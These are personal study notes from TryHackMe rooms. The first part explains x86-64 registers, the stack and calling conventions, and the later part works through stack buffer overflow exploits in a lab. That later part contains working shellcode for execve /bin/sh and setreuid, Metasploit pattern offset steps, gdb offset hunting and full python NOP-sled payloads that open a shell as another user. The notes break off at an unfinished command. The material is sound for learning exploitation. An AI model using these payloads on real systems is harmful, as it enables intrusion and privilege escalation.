https://tryhackme.com/room/x8664arch

- This initial overview will take x86 architecture with malware analysis into consideration - so there will be items missed out (don't freak out)

The Von Neumann architecture
![](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/8ddadb4fef3506e96698c52fdb668f62.png)

- CPU
	- Registers
	- Arithmetic Logic Unit 
		- Input/Output Devices
	- Control Unit
			- RAM

- Control Unit
	- Gets instructions from Main Memory (which is outside the CPU)
	- The address to the next instruction to execute is stored in a register called the **Instruction Pointer** or **IP**
		- In 32-bit systems, this is called **EIP**
		- In 64-bit systems, this is called **RIP**
- Arithmetic Logic Unit
	- Executes the instruction fetched from memory
	- Results of the executed instruction are then stored in either the Registers or in Memory
- Registers
	- Registers are the CPUs storage
	- Helps save time in executing instructions by placing important data in direct access to the CPU
- Memory
	- Main Memory, Physical Memory, RAM
	- Contains all the code and data for a program to run
- I/O Devices

Registers Overview
- The CPUs direct storage
- Has to be used effectively
- Divided into:
	- **Instruction Pointer**
		- Contains the address of the next instruction to be executed by the CPU
		- Also called the **Program Counter**
		- Originally was a 16-bit register in the Intel 8086 processor (from where the term x86 came from)
		- In 32-bit processors, the Instruction Pointer became a 32-bit register called the EIP
			- Extended Instruction Pointer
		- In 64-bit systems, it became the 64-bit register called RIP
			- Register Instruction Pointer
	- **General Purpose Registers**
		- The general purpose registers in an x86 system are all 32-bit registers
		- In 64-bit systems, they are extended as 64-bit registers
		- They contain:
			- EAX or RAX
				- The **Accumulator Register**
				- Results of arithmetic operations are often stored in this register
				- The last 16 bits of this register can be accessed by addressing AX
				- AL for the last lower 8 bits
				- AH for the last higher 8 bits
			- EBX or RBX
				- The **Base Register**
				- Often used to store the Base Address for referencing an offset
				- BX
				- BL
				- BH
			- ECX or RCX
				- The **Counter Register**
				- Often used in counting operations such as loops
				- CX
				- CL 
				- CH
			- EDX or RDX
				- The **Data Register**
				- Often used in multiplication/division operations
				- DX
				- DL
				- DH
			- ESP or RSP
				- The **Stack Pointer**
				- Points to the top of the stack and is used in conjunction with the Stack Segment register
				- Is **not** addressed in smaller addresses (bear this in mind)
			- EBP or RBP
				- Called the **Base Pointer**
				- Used to access parameters passed by the stack
				- used in conjunction with the Stack Segment register
			- ESI or RSI
				- The **Source Index** Register
				- Used for string operations
				- Used with the Data Segment (DS) register as an offset
			- EDI or RDI
				- Called the **Destination Index** register
				- Used for string operations as well
				- Used with the Extra Segment (ES) register as an offset
			- R8 - R15
				- 64-bit general purpose registers
				- Addressable in 32-bit, 16-bit and 8-bit modes (take note that this is only for 64-bit systems, ie introduced with 64-bit processors)
				- Examples of lower registers
					- R8D - lower 32-bit
					- R8W - lower 16-bit
					- R8B - lower 8-bit
					- D for double-word
					- W for word
					- B for byte
	- **Status Flag Registers**
		- When executing, indications around the status of the execution is sometimes required. 
			- This is where Status Flags come in
		- 32-bit register for 32-bit systems called EFLAGS
		- Extended to 64-bit systems called RFLAGS
		- Status flags register consists of individual single-bit flags that can be either 1 or 0
		- Some necessary flags are as follows:
			- Zero Flag
				- Denoted by ZF
				- Indicates when the result of the last executed instruction was zero
				- ie if an instruction is executed that subtracts RAX from itself, the result will be 0
					- In this instance, the ZF will be set to 1
			- Carry Flag
				- Denoted by CF
				- Indicates when the last executed instruction resulted in a number too big or too small for the destination 
				- ie if we add `0xFFFFFFFF` and `0x00000001` and store the result in a 32-bit register
					- The result will be too big for the register
					- The CF will be set to 1
			- Sign Flag
				- Denoted by SF
				- Indicates if the result of an operation is negative or the *most significant bit* is set to 1
				- If those conditions are met, the SF is set to 1
				- Otherwise it is set to 0
			- Trap Flag
				- Denoted by TF
				- Indicates if the processor is in debugging mode
				- If the TF is set, the CPU will execute one instruction at a time for debugging purposes
				- This can be used by malware to identify if they are being run in a debugger!
	- **Segment Registers**
		- 16-bit registers that convert the flat memory space into different segments for easier addressing
		- Six segment registers described below:
			- Code Segment (CS) Register
				- Points to the Code section in the memory
			- Data Segment (DS) Register
				- Points to the program's Data section in the memory
			- Stack Segment (SS) Register
				- Points to the program's Stack in the memory
			- Extra Segments
				- ES, FS, GS
				- Point to different data sections
				- These and the DS register divide the program's memory into four distinct data sections

Memory Overview
- When a program is loaded into memory in a Win OS - it sees an abstracted view of the memory
	- Meaning that the program doesn't have access to the entirety of memory
		- It only has access to its own memory
	- For that program, that is all the memory that it needs
- The OS does this abstraction (and I'm hoping to cover that later)
- For now, we'll be covering how a program sees its designated memory (we're focusing on reverse-engineering malware)
- Memory is divided into different sections - Stack, Heap, Code, and Data (doesn't have to be in that order). 
	- Code Section
		- Contains the program's code
		- Refers to the text section in a Portable Executable file
			- Which includes instructions executed by the CPU
		- The Code Section has execute permissions
			- Meaning that the CPU can execute the data in this section of the program memory
	- Data Section
		- Contains initialised data that is not variable and remains constant
		- It refers to the data section in a PE (Portable Executable) file
		- Often contains Global Variables and other data that are *not* supposed to change during the program's execution
	- Heap Section
		- Also known as **Dynamic Memory**
		- Contains variables and data created and destroyed during program execution
		- When a variable is created, memory is allocated for that variable at runtime
		- When that variable is deleted, the memory is freed
	- Stack Section
		- One of the most important parts of memory from a malware analysis point of view
		- The Stack Section contains local variables, arguments passed to the program, and the return address of the parent process that called the program
		- Since the return address is related to the control flow of the CPUs instructions, the stack is often targeted by malware to hijack the control flow

Stack Layout
- The stack is part of a program's memory that contains:
	- the arguments passed to the program
	- the local variables
	- program's control flow
- Malware will often exploit the stack to hijack the control flow of the program
- The stack operates with a **Last In First Out (LIFO)** way about doing things
	- Meaning that the last element *pushed* on to the stack is the first one that is *popped* out
- The CPU uses two registers to keep track of the stack
	- **Stack Pointer** (ESP, or RSP)
	- **Base Pointer** (EBP or RBP)
		- The Stack Pointer (ESP/RSP)
			- Points to the top of the stack
			- When any new element is pushed into the stack, the location of the Stack Pointer changes to consider the new element that was pushed on the stack
			- When an element is popped off the stack, it adjusts to reflect that change
		- The Base Pointer (EBP/RBP)
			- Remains constant
			- **This is the reference address where the current program stack tracks its local variables and arguments**
- Old Base Pointer and Return Address
	- Below the Base Pointer is the Old Base Pointer of the calling program (the program that calls the current program)
	- Below the Old Base Pointer is the Return Address
		- This is where the Instruction Pointer will return once the program's execution ends
	- A common technique to hijack control flow is to overflow a local variable on the stack such that it overwrites the Return Address with an address of the malware's choice
	- This technique is known as a **Stack Buffer Overflow**
- Arguments
	- Arguments passed to a function are pushed to the stack before the function starts execution
	- These arguments are present right below the Return Address on the stack
- Function Prologue and Epilogue
	- Function Prologue
		- When a function is called, the stack is prepared for the function to execute
			- Meaning that the arguments are pushed to the stack before the start of the function execution
		- After that, the Return Address and the Old Base Pointer are pushed onto the stack 
		- Once these are pushed, the Base Pointer address is changed to the top of the stack 
			- Which will be the Stack Pointer of the caller function at that time.
		- As the function executes, the Stack Pointer moves as per the requirements of the function.
		- This portion of code that pushes the Arguments, the Return Address, and the Base Pointer onto the Stack and rearranges the Stack and Base Pointers, is called the **Function Prologue**
	- Function Epilogue
		- Similarly, the Old Base Pointer is popped off the stack and onto the Base Pointer when the function exits
		- The Return Address is popped off to the Instruction Pointer, and the Stack Pointer is rearranged to point to the top of the Stack.
		- The part of the code that performs this action is called the **Function Epilogue**
	![](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/aed105638dc28ee3524baeaba8925e12.png)

---

**Processes**
https://tryhackme.com/room/bof1

- Current computer architecture allows processes to run concurrently
- The computer switches between processes very quickly (like, super quickly) to make it seem as though they are running at the same time
	- Have a look at what runs through your computer in real-time using a tool like Process Monitor (on Windows) to have a look at what processes the CPU is processing as time goes by. 
- Switching between processes is called a **context switch**
- Since each process needs different information to run (the current instruction to execute), the OS has to keep track of all the information in a process.
- The memory in the process is organised sequentially and has the following layout

![](https://i.imgur.com/KmWsaIs.png)

- User Stack
	- Contains the information required to run the program
	- Includes:
		- Current program counter
			- Saved registers
			- Information about functions
			- Local Arguments
			- and more information 
		- Unused memory, used in case the stack grows (downwards)
		- Shared Library regions
			- Used to either statically/dynamically link libraries that are used by the program
		- The Heap
			- Increases and decreases dynamically depending on whether a program dynamically assigns memory
			- The section above the heap is unassigned, which can be used in the event that the size of the heap increases
		- The Program Data and Code
			- Stores the program executable and initialised variables

**x86-64 Procedures**
- A program will normally comprise of multiple functions and there needs to be a way to be able to track which function has been called and which data is passed from one function to another
- The stack is a region of contiguous memory addresses and it is used to make it easy to transfer control and data between functions
- The top of the stack is at the lowest memory address and the stack grows towards lower memory addresses
- The most common operations of the Stack are:
	- Pushing
		- Used to add data on to the stack
	- Popping
			- Used to remove data from the stack
	![](https://i.imgur.com/YITSp30.png)

`push var`
- The assembly instruction to push a value onto the stack
- It does the following:
	- Uses var or value stored in memory location of var
	- Decrements the stack pointer (known as `rsp`) by 8
	- Writes the above value to new location of `rsp` which is now the top of the stack
	![](https://i.imgur.com/TFH7KDf.png)

	![](https://i.imgur.com/fLz86wR.png)

`pop var`
- Assembly instruction to read a value and pop it off the stack
- It does the following:
	- Reads the value at the address given by the stack pointer (`rsp`)
	- Store the value that was read from `rsp` into var
	- Increment the stack pointer by 8 (`0x8`)

- **It is important to note that the memory does not change when popping values of the stack - it is only the value of the stack pointer that changes.**
- Each compiled program may include multiple functions, where each function would need to store local variables, arguments passed to the function and more. 
- **To make this easy to manage, each function has its own separate stack frame**
	- Where each new stack frame is allocated when a function is called, and deallocated when the function is complete
*Stacks direction of growing is lower*
	![](https://i.imgur.com/0OsNBwQ.png)

```
	int add(int a, int b){
		int new = a + b;
		return new;
	}

	int calc(int a, int b){
		int final = add(a, b);
		return final
	}

	calc(4, 5)
```
- Assuming that the current point of execution is inside the `calc` function
- The **Caller Function** will be `calc`
- The **Callee Function** will be `add`
- Assembly code representation:
	- *(I hope these images stick around :) thanks THM Crew!)*
	![](https://lh3.googleusercontent.com/drfkuTdzr6yTKq2tPgCO95_knSqbNa0_iApkl3w62yDGZIOu_6ZxMMcQE4SD-X4p-3AW656Azf3iWqCjRqC4S6O8PbcseQS3r0mzuyB0T2WZdfxs7HtVVqGheU5R2zBVSjEix3sS)
- The Add Function is invoked by using the call operand in Assembly
- The call operand can either take a label as an argument (a Function Name) or it can take a memory address as an offset to the location of the function in the form of call \*value 
- Once the Add Function is invoked (and also after it is completed)
	- The program would need to know what point to continue the program
	- To do this, the computer pushes the address of the next instruction on to the stack
	- After this, the program would allocate a stack frame for the new function
	- Change the current instruction pointer to the first instruction in the function
	- Change the stack pointer (`rsp`) to the top of the stack
	- And change the frame pointer (`rbp`) to point to the start of the new frame.
	![](https://lh3.googleusercontent.com/IgWTFeegf8jSIlpJAz-jdJW_I477jiXWvY-kkGUjZ_iIIGgj_gBKac0-bzonwNrlpAw6sUvh7ZkejC50peTnWKfxZAUUiQA_QiYwlAkgDA7gkOdJZIqpDruAeVeqOODCEfCsv325)
	![](https://i.imgur.com/BZMUlMe.png)
- Once the function is done executing
	- It will call the return instruction 
	- This instruction will pop the value of the return address of the stack
	- Deallocate the stack frame for the add function
	- Change the instruction pointer to the value of the return address
	- Change the stack pointer (`rsp`) to the top of the stack 
	- and change the frame pointer (`rbp`)to the stack frame of calc
	![](https://lh4.googleusercontent.com/t_UvTV0iBr99rf31_UNd3VmXKjpN4CNwJ5bI3_q5mGksmCMYTzryujyZg_6NP-sljh1J7xFfbeUEv0cPmoXsLtBF6GpUTJVMnqU4xquGSr2UQNFg1xhz7E6zRVgAZfrdlUlOoWAl)
	![](https://i.imgur.com/VF6LfjU.png)
- Looking at how data is transferred
- Above (hopefully the image is still there..), we save the functions that take arguments
- The calc function takes two (2) arguments (a and b). 
- Up to six (6) arguments for functions can be stored in the following registers:
	- `rdi`
	- `rsi`
	- `rdx`
	- `rcx`
	- `r8`
	- `r9`
- **NOTE: `rax` is a special register that stores the return values of the functions (if there are any!)**
- If a function has any more arguments, then these arguments would be stored on the functions stack frame.
- Now it can be seen that a Caller Function may save their values in their registers.
- What about a Callee also wanting to save their values in registers??
	- So that the values are not overwritten
		- The Callee Function (or values??) first save the values of registers on their stack frame
		- Use the registers
		- And then load the values back into the registers
- The Caller Function can also save values on the caller function frame to prevent the values from being overwritten
- Here are some rules around which registers are Caller and Callee saved:
	- `rax` is Caller saved
	- `rdi`, `rsi`, `rdx`, `rcx`, `r8` and `r9` are called (*not sure if this is supposed to be callee or caller, but THM wrote it as called..*) saved (and they are usually arguments for the functions)
	- `r10`, `r11` are Caller saved
	- `rbx`, `r12`, `r13`, `r14`, are Callee saved
	- `rbp` is also Callee saved (and can be optionally used as a frame pointer)
	- `rsp` is Callee saved

- So far (this is on the THM module) - this is "a more thorough example of the run time stack:"
	![](https://i.imgur.com/vA0ug3J.png)

Endianess
- The above programs outline binary information being represented in hexadecimal format
- Note that different architectures actually represent the same hexadecimal number in different ways
	- This is referred to as **endianess**
- Take the value of 0x12345678
	- Here the least significant value is the right most value (78)
	- while the most significant value is the left most value (12)
- **Little Endian** is where the value is arranged from the least significant byte to the most significant byte
		LSB												MSB
		78				56				34				12
- **Big Endian** is where the value is arranged from the most significant byte to the least significant byte
		MSB												LSB
		12				34				56				78
- Here each "value" requires at least a byte to represent, as part of a multi-byte object. 

Overwriting Variables
```C
int main(int argc, char **argv)
{
	volatile int variable = 0;
	char buffer[14];

	gets(buffer);

	if(variable != 0) {
		printf("You have changed the value of the variable\n");
	} else {
		printf("Try again?\n");
	}
}
```
- Memory is allocated in continuous bytes, one could assume that variables that are written adjacently to each other in code would be allocated next to each other in the buffer
	- However, this is not always the case. With how the compiler and stack are configured, when variables are allocated - they would need to be aligned to particular size boundaries (8 bytes, 16 bytes) to make it easier for memory allocation/deallocation. 
	- So if a 12-byte array is allocated where the stack is aligned for 16bytes, this is what the memory would look like:
		![](https://i.imgur.com/kjxX8SC.png)
		buffer										padding
		0										12			16
	- The compiler would automatically add 4 bytes to ensure that the size of the variable aligns with the stack size. 
	- From the image of the stack (above), one can assume that the stack frame for the main function looks like this:
		![](https://i.imgur.com/lqE6o0S.png)
	\[Text Representation of the image above *in-case it disappears*\]
	```
		Stack Bottom
		--------------
		Saved Registers
		Volatile int variable
		Char buffer[13]
		.
		.
		.
		buffer[0]
		Char **argv
		Int argc
		--------------
		Stack Top
	```
	- Even though the stack grows downwards, when data is copied/written into the buffer, it is copied from lower to higher addresses
	- Depending on how data is entered into the buffer, means that it's possible to overwrite the integer variable
	- From the C code above - the Gets Function is used to enter data into the buffer from standard input. 
		- The function is dangerous because it doesn't really have a length check
		- This would mean that you can enter more than 14 bytes of data, which would then overwrite the integer variable

---
*Additional Notes*
- *There are several common ways to get the memory address of a function named `special()` from code that is already compiled:*
	- *Using GDB:*
		*`gdb ./program (gdb) print special`*
	- *Using objdump:*
		*`objdump -t ./program | grep special`*
	- *Using nm:*
		*`nm ./program | grep special`*
- *In a simple scenario - if you have identified the amount of characters required to cause a buffer overflow due to some badly written C code, you could then put that many characters into the stdin of the compiled code/program, then since the buffer has overflowed be able to call other functions from somewhere - providing you know what address in memory those functions live in (bearing in mind that these memory addresses will often be written in Hex, and ALSO bearing in mind, of little endian, or big endian - depending on the architecture that is being used.* 
	- *Something like that*
----
Another example:
```C
void copy_arg(char *string)
{
	char buffer[140];
	strcpy(buffer, string);
	printf("%s\n", buffer);
	return 0;
}

int main(int argc, char **argv)
{
	printf("Here's a program that echo's out your input\n");
	copy_arg(argv[1]);
}
```
- The copy_arg Function the strcpy Function is copying input from a string (which is argv\[1\] which is a command line argument) to a buffer which has a length of 140 bytes. 
- The nature of strcpy doesn't check the length of the data being input, so here it's also possible to overflow the buffer. 
- The stack for the copy_arg Function (this stack excludes the stack for the strcpy Function)
	![](https://i.imgur.com/zNMC7in.png)
	```
	Stack Bottom
	------------
	Return Address
	------------
	Saved Registers
	------------
	Char Buffer [140]
	.
	.
	.
	buffer [0]
	-------------
	Stack Top
	```
	- When a function (in this context, the Main Function) calls another function (in this case the copy_args Function), it needs to add the return address on the stack so that the callee function (copy_args) knows where to transfer control to once its finished executing.
	- From the stack above, we know that data will be copied upwards from buffer\[0\]  to buffer\[140\]. 
	- Since we can overflow the buffer, it follows that we can overflow the return address with our own value
		- **We can control where the function returns and change the flow of execution of a program...**
	- The flow of execution can be controlled by directing the return address to some memory address. 
		- This is where shellcode comes in 
			- Shell code quite literally is code that will open up a shell!
			- It is binary instructions that can be executed..
			- Since shellcode is just machine code (in the form of binary instructions) you can usually start off by writing a  C program to do whatever you want, compile it into assembly, and extract the hex characters (alternatively it would involve writing your own assembly). 
			- For now, the module I'm doing will use the shellcode that will open up a basic shell
			- `\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05`
			- The basic idea is we'd need to point the overwritten return address to the shell code, but where will the shellcode be stored and what actual address would we point at it?!
			- Store the shellcode in the buffer, because we know the address at the beginning of the buffer - we can overwrite the return address to point to the start of the buffer
	- Process so far:
		- Find out the address of the start of the buffer and the start address of the return address
		- Calculate the difference between these two addresses so that you know how much data to enter to overflow
		- Start out by entering the shellcode in the buffer, entering random data between the shellcode and the return address and the address of the buffer in the return address
			![](https://i.imgur.com/ktEI9zu.png)
			```
			Stack Bottom
			------------
			Address of Buffer (overwritten Old Return Address)
			------------
			Random Data (overwritten saved registers)
			------------
			Random Data (inside buffer)
			------------
			Shellcode (inside buffer)
			------------
			Stack Top
			```
		- Keep in mind that memory addresses may not be the same on different systems
			- Even across the same computer when a program is recompiled
		- So we can make this flexible using a NOP instruction
			- A NOP instruction is a No Operation instruction
			- When the system processes this instruction, it does nothing, and carries on execution
			- Represented by using `\x90`
			- Putting NOPs as part of the payload means an attacker can jump anywhere in the memory region that includes a NOP and eventually reach the intended instructions
			- This is what an Injection Vector would look like:
			![](https://i.imgur.com/olQ17Tg.png)
			NOP Sled			|	Shell Code		|	Memory Address
	- Shellcode, Memory Addresses and NOP Sleds are usually in hex code
	- To make it easy to pass the payload to an input program, you can use python:
	- `python -c "print (NOP * no_of_nops + shellcode + random_data * no_of_random_data + memory_address)"`
	- In this particular module/challenge *something* like:
	`python -c "print('\90' * 30 + '\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05' + '\x41' * 60 + '\xef\xbe\xad\xde') | ./program-name"
	- lol `deadbeef` ^ 
	- There can be cases where you need to pass xargs before the ./prrogram-name
- *oof. After a while, a decent while, I had to look up some additional information because my knowledge-set with debugging and with C is very limited at this stage (if even existent!)*
---
**This entire part here is workings alongside the following write-up for https://tryhackme.com/room/bof1 - Task 8**

- https://l1ge.github.io/tryhackme_bof1/ **(thanks bud!!!!!!! - real good writeup, great for learning - check this out, for sure.)**
	- The use of `gdb` is real
		- `gdb program-name`
		- Finding out how many characters/bytes the program can handle (for the context of this particular module/scenario - also a handy command to know - pretty much the first time I also am using gdb - like the writeup above)
		- `(gdb) run $(python -c "print('A'*140)")`
			- See the outcomes you get, what can be accepted or is 'normal' and what isn't
			- The tactic here is to find out where the base-point `rbp` is and also where the return address starts and finishes. Also how big these addresses are (how many bytes in size - again the writeup covers this so I won't rewrite what is written, read it up, real good)
		-  -----------
		- *144 characters
		- ***Inferior 1 (process 13411) exited normally***
		- -----------
		- *145 characters*
		- ***0x0000000000000000 in ?? ()****
		- -----------
		- *This started with **146 to 151** characters*
		- ***0x0000000000400595 in main ()***
		- *Is this rbp?* 
		- -----------
		- *152 characters*
		- ***0x0000000000400500 in do_global_dtors_aux ()***
		- *This can be considered the START of the RETURN ADDRESS*
		-  -----------
		- *153 characters*
		- ***0x0000000000400041 in ?? ()***
		- -----------
		- *158*
		- ***0x0000414141414141 in ?? ()***
		- *6-bytes*
		- *END of the RETURN ADDRESS*
		- -----------
		- ***159***
		- ***0x0000000000400563 in copy_arg ()***
		- -----------
		- See the patterns being created there, we know (since we have access to the source code in this instance - which won't be the case otherwise...) that the buffer goes from 0-140. 
			- Seems like there are six-bytes that are kept for the return address, which starts to get the overflow of the character "A" (x/41) from 152/153 onwards to 158 characters being input to the program
	- Metasploit to double-check the above findings:
		- Metasploit can be used as well to generate a random length pattern to confirm if the return address we identified above is accurate or not
		- Generate some a pattern of random length with the `pattern_create.rb` tool from the MSF (Metasploit Framework)
			- Going with a 200 byte pattern in this instance as per that write-up (so not quite random, but 200)
			- `/usr/share/metasploit-framework/tools/exploit/pattern_create-rb -l 200`
			- Copy the given pattern
			- run it in `(dbg)`
				- We've gotten a segmentation fault
				- Let's look at what `rbp` register has in it
					- `(gdb) i r`
						- Shows all registers :) 
				- `rbp` in this exercise has been overridden with the pattern we gave it (I don't see the resemblance - but will look at this more carefully)
			- Check the value that `rbp` has with MSF's `pattern_offset.rb` tool (don't forget to do an `-h` on various tools programs if you want to know more :) )
				- `../../../../../pattern-offset.rb -q <rbp-value>`
					- Exact match at offset 144
				- `rbp` having a size of 8bytes
					- 144+8 = 152
				- The offset found above is confirmed. 
	- Picking a Shell Code
		- Refer to l1ge's write-up above. 
			-   *(one day, I will write my own! Har!)*
			- *Although some of the stuff here, a lot of it, is my own .. But like an actual formal one :)*
			- `\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05`
			- Run this `dbg`
			- `(dbg) run $(python -c "print 'A'*100 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + 'B'*6")`
			- Examine the dump of the code with 
				- `(dbg) x/100x $rsp-200`
					- Dumps 100\*4 bytes from memory location of $rsp-200 bytes
				- Take note of what is displayed and the code that was run above.
`0x7fffffffe2a8: 0x41414141   0x41414141   0x41414141   0x48583b6a`
				- You'll take note that the memory address at `0x7fffffffffe2a8` is where the shellcode injection resides, but in the fourth column
					- This is the address of the first column on this line (currently with the A's/41s that we gave it earlier)
					- Our shellcode is three columns further in
					- We'll need to add 3\*4=12 bytes to `0x7fffffffffe2a8`
					- 12 in hex is `0xC`
					- `0x7fffffffffe2a8` + 0xC which comes out to `0x7fffffffffe2b4`
					- This is the exact address of where the shell code starts in the buffer
			- As per THM's instruction earlier above, memory can shift a bit sometimes, from one execution to the next. Use of NOPs will be required
				- Injecting NOPs will mean that we won't need to get the exact address of where the Shellcode starts, any address in NOPS will do
				- The program will skip all NOPs and execute the shellcode
			- Replace the first set of A's with NOPs (`\x90`)
			- Check in dbg again
				- `(dbg) x/100x $rsp-200`
				- Pick any address as long as NOPs are in it
					- `0x7fffffffe298`
				- Convert that address to Little Endian
					- `0x98e2ffffff7f`
				- And to:
					- `\x98\xe2\xff\xff\xff\x7f`
				- Replace the last `6*B` part in the above command with the above memory address and voila!!!!! 
`./buffer-overflow $(python -c "print '\x90'*100 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + '\x98\xe2\xff\xff\xff\x7f'")`
- Thanks  l1ge :) 
	- There is a huge but in Task 8 though. 
	- Albeit that we were able to pop a shell out of the buffer overflow exploit we did.... We're still User1. The secret.txt file is owned by User2. Great.
	
- We need to **set the Real User ID** in this instance (which is 1002) `setreuid()`
		- https://www.geeksforgeeks.org/real-effective-and-saved-userid-in-linux/
	- "Could write a shellcode in C, compile it, look at the assembly code, remove the bad characters and use the exploit"
	- "Go straight to assembly, find an existing shellcode that uses `setruid()`
	- Using resources like pwntools
	- And well any other thorough research that will lead you to other findings and general knowledge

	- |1ge has written this assembly code:

```asm
xor    rdi,rdi
xor    rax,rax		
xor    rsi, rsi
mov    si, 1002
mov    di, 1002
mov    al,0x71    
syscall
xor    rdx,rdx
movabs rbx,0x68732f6e69622fff
shr    rbx,0x8
push   rbx
mov    rdi,rsp
xor    rax,rax
push   rax
push   rdi
mov    rsi,rsp
mov    al,0x3b
syscall
push   0x1
pop    rdi
push   0x3c
pop    rax
syscall
```
- Which when assembled (using a tool such as https://defuse.ca/online-x86-assembler.htm#disassembly) comes out to:
`\x48\x31\xFF\x48\x31\xC0\x48\x31\xF6\x66\xBE\xEA\x03\x66\xBF\xEA\x03\xB0\x71\x0F\x05\x48\x31\xD2\x48\xBB\xFF\x2F\x62\x69\x6E\x2F\x73\x68\x48\xC1\xEB\x08\x53\x48\x89\xE7\x48\x31\xC0\x50\x57\x48\x89\xE6\xB0\x3B\x0F\x05\x6A\x01\x5F\x6A\x3C\x58\x0F\x05`
\[62 bytes\]

- **|1ge had then referred the write-up to *pwntools* and its shellcraft module**
- This is super easy ..... (from the look of things!)
- `pwn shellcraft -f d amd64.linux.setreuid 1002` 
- You get:
	- `\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05`
	- `-f d` sets the format to "escaped" 
	- `-f a` will allow you to see the assembly version :) 
	- Slap this bit of shellcode on to the front of the previous shellcode and you're golden, almost
	- Note that since our new revised shellcode is bigger by 14bytes, we'd need to amend how many NOP instructions we have in it
		- (just take away 14 from the 100, 86)
	- Golden.

---

**My steps/notes for Task 9** 

*( I will put these in another location at some stage since I want these pages to hold more general notes around a topic - but at the moment I'm learning and practicing, so bear with me yea? :) )*
```

(gdb) run $(python -c "print 'A'*###) <---- running the number of characters as below

155 characters
Inferior 1 (process 18950) exited normally

156 characters
0x0000000000000000 in ?? () <--- this one or the next one being rbp?

157 characters
0x00000000004005d3 in main ()

158 characters
0x00000000004005d3 in main ()

159 characters
0x00000000004005d3 in main ()

160 characters
0x00000000004005d3 in main ()

161 characters
0x00000000004005d3 in main ()

162 characters
0x00000000004005d3 in main ()

163 characters
0x0000000000400500 in __do_global_dtors_aux () <---- Return Address

164 characters
0x0000000000400041 in ?? () <---- Return Address starting to overflow

165 characters
0x0000000000004141 in ?? ()

166 characters
0x0000000000414141 in ?? ()

167
0x0000000041414141 in ?? ()

168
0x0000004141414141 in ?? ()

169
0x0000414141414141 in ?? ()

170 - 181, 190 (not sure about others)
0x00000000004005ab in concat_arg ()
```
- We'll use the MSF pattern generator now, same as before - we'll use a 200 character approach
	`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200`
- Results in
`Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag`
- Run the patter above
	- `(gdb) run '<patter-above>`
- Check the register(s)
	- `(gdb) i r`
- Check what `rbp` has:
	- `0x4133664132664131`
- Check this against MSF's `pattern_offset.rb`
	- `../pattern_offset.rb -q 0x4133664132664131`
	- Exact match at offset 155
	- 155 + 8 = 163 (as per notes above, seems to check out)
- `shellcode`
	`\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05` (40 bytes)
- Run it through in `dbg`
	```
	(gdb) run $(python -c "print '\x90'*111 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + 'B'*6")
	```
	- I confirmed that this would overwrite the complete Return Address by manually checking (the math I need to get my head around still as to why - but used `gdb` to be able to manually check)
	- `Program received signal SIGSEGV, Segmentation fault. 0x0000424242424242 in ?? ()`
- I checked with `(gdb) x/100x $rsp-200`
- `0x7fffffffe298: 0x90909090      0x90909090      0x90909090      0x48583b6a`
	- We're in the third column again needing to add 12 to `0x7fffffffe298`
	- Going to try `0x7fffffffe2a4` (I used an ASCII table for this, lol, https://www.ascii-code.com/)
	- We have the exact address of where our Shellcode sits, but, we're going to be using NOPs anyway... But I guess good practice :) 
- I am going to use this memory address since it's full of NOPs, and just before the line where our Shellcode sits:
	- `0x7fffffffe288: 0x90909090      0x90909090      0x90909090      0x90909090`
	- Little Endian
	- `\x88\xe2\xff\xff\xff\x7f`
	- `./buffer-overflow-2 $(python -c "print '\x90'*111 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + '\x88\xe2\xff\xff\xff\x7f'")`
	- IT WORKED!
	- Now lets get the `reuid` for user3 (1003) sorted out with the use of pwntools
		- `pwn shellcraft -f d amd64.linux.setreuid 1003`
		- `\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05`
		- We add this to the start of our first Shellcode and make the difference of 14 from 111 in our current NOP input
		- New command run:
		```
